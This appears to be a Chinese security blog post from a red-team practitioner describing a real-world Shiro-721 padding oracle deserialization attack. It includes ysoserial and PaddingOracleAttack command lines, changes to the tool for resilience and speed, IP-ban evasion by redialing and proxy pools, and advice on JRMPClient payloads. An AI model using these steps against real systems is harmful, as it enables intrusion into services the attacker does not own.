#  红队第4篇 | Shiro Padding Oracle无key的艰难实战利用过程

原创 abc123info [ 网络安全abc123 ](javascript:void\(0\);)

**网络安全abc123** ![]()

微信号 abc123network

功能介绍 ABC_123，2008年入行网络安全，某攻防实验室创始人，Struts2工具及Weblogic
T3/IIOP反序列化工具原创作者。擅长红队攻防、0day挖掘、代码审计、网络安全培训、应急响应、日志分析等。专注于前沿网络安全技术。

____

___发表于_

收录于合集

#反序列化 6 个

#shiro 3 个

#padding oracle 1 个

#红队 14 个

#攻防比赛 17 个

**‍** **  Part1 前言 ** ****

 ****大家好，上期分享了银行站的一个Java 的SSRF组合洞案例，这期讲讲分享一个Shiro Padding Oracle漏洞利用过程。  

Shiro反序列化漏洞自16年公布以来，至今已经有6年了，每次攻防比赛都还能遇到，其攻击大致可分为2种方式：

 **  1 ** **   ** **一种就是平时攻击队最常用的** **Shiro-550**
**，对应CVE-2016-4437，影响范围Apache shiro
<=1.2.4。**漏洞成因是AES的秘钥是硬编码的，漏洞利用的前提是需要猜到加密key。

 ** **  2 ** **   **** ** ****另外一种就是** **Shiro-721**
**，对应CVE-2019-12422，影响范围Apache Shiro <
1.4.2**。后期Shiro组件的加密key是系统随机产生的，无法猜到key。但是安全专家很快发现，Shiro的加密方式是AES-128-CBC，CBC加密方式存在一个
Padding Oracle
Attack漏洞，可以得到一个存在反序列化数据的AES加密密文，发送给服务端后，shiro组件会解密然后触发反序列化代码执行漏洞。这种攻击方式的前提是需要登录后台获取一个合法Cookie。

 **一次成功的Shiro Padding Oracle需要一直向服务器不断发包，判断服务器返回，攻击时间通常需要几个小时。**
由于此漏洞利用起来耗时时间特别长，很容易被waf封禁，因此在真实的红队项目中，极少有此漏洞的攻击成功案例，大家多数都是在虚拟机环境下测试。

但是有一个红队项目，在真实的生产环境中，硬逼着我把这个攻击给弄成功了，因为现在外围打点越来越难了，好不容易找到一个口子，也不愿意放弃。期间踩了不少坑，只能说一句：
** _虚拟机环境下和生产环境下漏洞利用是有很大不同的_** 。接下来分享一下具体实战过程。

#  **  Part2 研究过程 **

  * ##  **虚拟机下测试  **

首先看一下虚拟机下的漏洞测试过程：

本地搭建一个环境，勾选网页的Remember Me选项，首先burpsuite抓到一个登陆后的Cookie。

![](https://gitee.com/fuli009/images/raw/master/public/20221008082353.png)

使用ysoserial反序列化工具包生成一个URLDNS的payload java -jar ysoserial-9-echo-all.jar URLDNS
http://www.ddd.com > payload.ser  

使用工具PaddingOracleAttack来测试 ：

java -jar PaddingOracleAttack-1.0-SNAPSHOT.jar
http://192.168.237.128:8080/samples-web-1.2.42/
TsXEGDoadwH9nWC3g7WmdN1Ntzbw0kqQMx3ZEaPqL3+++wXZW7jsgImQp8tJi/SDMWjlsWAljJ1bwbyhps/Kf1kK2uu0B5XfyeuAQ7SwO8wGPRcO3u++CW0D5XgSrxJZNI2iQK1sGV4z/hRxyVpXf1unsUUISmNaNiP1o0hULvu3vEgqLaSI435iliJiiarLKh2+UOlAE/lpyJEWgjZvNWFtNHCuIZvBfcJheJ4Thy8OvPytDyASaEwsZtFq2883t8awu9N1wdR2a7g7ONJsVU1yX7d7S8wnrov4PheKVQhiBwLfLa2iMq2MBXrpWtGec8oH7bf48ZD8e2Bbtqu9rV8JKeVbVSjfqYBlUzeLajoboQWtXlNzDtJtbfooqnrgC8BiLvLfElcY8bMiRsmcMovkOxR7Yt5lCVhvfFpUnr3Z7y94lSK3lLUPJ2JxjAzGK45iP5WKreEaQ4S8PyggTmR3dkLtmRfJ4jk4PmbpNDx8BaQAxJIuwjGX2G92JavY
16 payload.ser

配置好后，开始攻击过程：

![](https://gitee.com/fuli009/images/raw/master/public/20221008082403.png)

大约过了1个小时，工具会返回一个rememberMe Cookies值  

![](https://gitee.com/fuli009/images/raw/master/public/20221008082404.png)

使用burpsuite发包后，dns出现记录，证明漏洞利用成功。  

![](https://gitee.com/fuli009/images/raw/master/public/20221008082408.png)

![](https://gitee.com/fuli009/images/raw/master/public/20221008082410.png)

虚拟机下测试，基本上按照上述步骤一步步操作，就能攻击成功，但是在生产环境中实战，各种各样的奇葩问题都出来了，主要遇到了4个坑：  
  

  * ##  **第1个坑：网络超时问题**

在真实实战环境中，我们的攻击对象是外网应用系统，持续几个小时的发包过程，免不了会出现网络超时的情况。我发现，现有的相关漏洞利用工具或者脚本，只要网络超时一次，程序就会报错，整个攻击过程就会停止掉。因为这些程序没有对发包失败抛出异常的情况做出处理，从而导致工具停止工作。

接下来没办法只能自己改工具了，因为我用java写程序习惯了。于是我从github上看了几个Java写的Shiro Padding
Oracle工具，找到了longofo这个作者写的工具，看起来不错。于是下载源码，使用idea载入，对代码做了一下修改，代码很low，但是快速解决问题即可。

如下图所示：一旦发包失败，程序会重新发包，可以重试不超过20次，一旦发包成功，就跳出循环，进行下一次发包。待会儿讲讲为啥要重试20次，哎，太难了。。。

![](https://gitee.com/fuli009/images/raw/master/public/20221008082412.png)

为了便于实时查看攻击过程中出现了哪些问题，我在异常处理流程中，加了几行代码，一旦发包失败，输出错误提示。  

![](https://gitee.com/fuli009/images/raw/master/public/20221008082414.png)

  * ##  **第2个坑：GET请求变HEAD**

网络超时问题解决了，后续我发现工具速度还可以提升，作者的工具发的是GET请求，于是果断把GET请求换成了HEAD请求，速度提升不少。。。如下图所示：我把HttpGet方法，换成了自己写的HttpHead方法。

![](https://gitee.com/fuli009/images/raw/master/public/20221008082415.png)

  * ##  **第3个坑：封IP及代理池问题**

持续发包快半个小时的时候，程序一直网络超时，把我吓了一跳，我以为把网站跑挂了，结果发现我的IP被封了。后期我发现，大概每攻击30分钟左右，IP会被封禁一次，原因是多种多样的。于是我挂了一个付费的代理池，结果代理池有的代理ip不稳定，经常报错，而且严重拖慢攻击速度，显然对于Shiro
Padding Oracle
攻击不适用。哎，真是太难了。。。没办法，我把超时重试次数改为了20次，因为20次重试时间足够长，一旦发现被封IP，我就拨号换一次IP就行了，还是自己宽带拨号换IP稳定。

  * ##  **第4个坑：payload过长**

攻击时间的长短，取决于ysoserial生成的payload的大小，payload越长，攻击时间就越长。于是我各种测试，发现Ysoserial工具中的URLDNS及JRMPClient这两个payload足够短，比较适合用来做shiro
padding
oracle攻击。尤其是JRMPClient这个payload，如果目标系统能出网，就可以在服务端不断地更换利用链去尝试，利用成功的概率是非常大的。

最终，攻击成功了，我虚拟机下花了不到1小时共计完成，但是在真实生产环境测试，攻击成功一次DNS或者JRMPClient攻击，程序需要跑大约4个小时左右，2次攻击加起来近9个小时。所以，真是太难了。。。

![](https://gitee.com/fuli009/images/raw/master/public/20221008082416.png)

#  **  Part3  总结 **

 **1.   **没有0day的时候，就把Nday用到极致吧。

 **2.   **反序列化攻击的exp，往往都需要视不同的生产环境去做修改，不能生搬硬套。

 **3.   **对于本次案例，由于攻击过程太长，真正有价值的是URLDNS、JRMPClient，其它的CC链
CB链的payload长度过长，想要攻击成功，需要好几天的时间，那基本上是很难的。

 **4.   **Shiro Padding
Oracle最好是在下班点之后进行测试，避开业务高峰期，减少对生产环境的业务影响。![](https://gitee.com/fuli009/images/raw/master/public/20221008082417.png)

专注于红队、蓝队技术分享

每周一篇，敬请关注

![](https://gitee.com/fuli009/images/raw/master/public/20221008082418.png)

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

